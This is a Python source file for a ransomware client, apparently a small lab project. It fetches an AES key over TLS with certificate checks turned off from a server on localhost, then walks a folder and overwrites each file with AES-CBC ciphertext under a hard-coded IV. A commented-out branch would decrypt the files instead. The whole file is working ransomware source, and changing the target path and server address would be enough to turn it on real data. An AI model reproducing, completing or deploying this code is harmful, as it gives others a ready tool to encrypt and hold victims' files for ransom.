import os
import socket
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
SERVER_IP = "127.0.0.1"
SERVER_PORT = 8080
PATH = "C:\\Users\\hyani\\Downloads\\t1"
class RansomewareClient():
    def __init__(self, random_key) -> None:
        self.key = random_key
        self.iv = b"D\xbb\x03\xac\xb7\xb6\xad\x81\xdf\x86\xdag'\xf4\x00\xe6"
        self.backend = default_backend()


    def iterate_directory(self, dirpath, actionFunc):
        for dirpath, dirnames, filenames in os.walk(dirpath):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                actionFunc(filepath)


    def encrypt_file(self, path):
        plaintext = self.read_file(path)
        encrypted_text = self.encrypt_payload(plaintext)
        self.write_file(path, encrypted_text)


    def decrypt_file(self, path):
        encrypted_text = self.read_file(path)
        plaintext = self.decrypt_cipher(encrypted_text)
        self.write_file(path, plaintext)


    def read_file(self, path):
        with open(path, "rb") as file:
            plaintext = file.read()
            return plaintext


    def write_file(self, path, content):
        with open(path, "wb") as encrypted_file:
            encrypted_file.write(content)


    def encrypt_payload(self, plaintext):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        encryptor = cipher.encryptor()
        padded_payload = plaintext + b' ' * (16 - len(plaintext) % 16)
        ciphertext = encryptor.update(padded_payload) + encryptor.finalize()

        return ciphertext


    def decrypt_cipher(self, ciphertext):
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        return padded_plaintext.rstrip(b' ')


def wrap_socket(sock):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context.wrap_socket(sock)

if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_sock = wrap_socket(sock)
    ssl_sock.connect((SERVER_IP, SERVER_PORT))
    random_key = ssl_sock.recv(1024)
    ransomware = RansomewareClient(random_key)
    func = ransomware.encrypt_file

    #if input("For decrypt enter y: ") == "y":
    #    func = ransomware.decrypt_file
    
    ransomware.iterate_directory(PATH,func)
